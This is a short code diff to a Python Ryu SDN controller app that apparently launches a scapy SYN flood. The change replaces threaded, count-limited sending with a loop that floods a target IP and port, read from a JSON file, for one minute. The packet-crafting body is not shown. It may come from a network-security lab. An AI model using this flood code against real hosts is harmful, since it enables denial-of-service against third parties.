@@ -11,10 +11,9 @@ from ryu.lib import dpid as dpid_lib
 import json
 import socket
 import time
-import random
-import threading
 import sys
 from scapy.all import *
+import random
 
 
 simple_switch_instance_name = 'simple_switch_api_app'
@@ -22,10 +21,9 @@ url = '/hello'
 conf.iface = 'eth0'
 
 
-class sendSYN(threading.Thread):
+class sendSYN():
 
     def __init__(self, target, port):
-        threading.Thread.__init__(self)
         self.target = target
         self.port = port
 
@@ -70,15 +68,15 @@ class SimpleSwitchRest13(simple_switch_13.SimpleSwitch13):
             json_data = json.load(f)
             ip = json_data['target']
             port = json_data['port']
-            count = json_data['count']
+            runtime = time.time() + 60
 
         while 1:
-            if total < count:
-                sendSYN(ip, port).start()
+            if time.time() < runtime:
+                sendSYN(ip, port).run()
                 total += 1
                 print total
             else:
-                print "packet over" + str(count)
+                print "Send one minute"
                 break
         return "read target info"
 
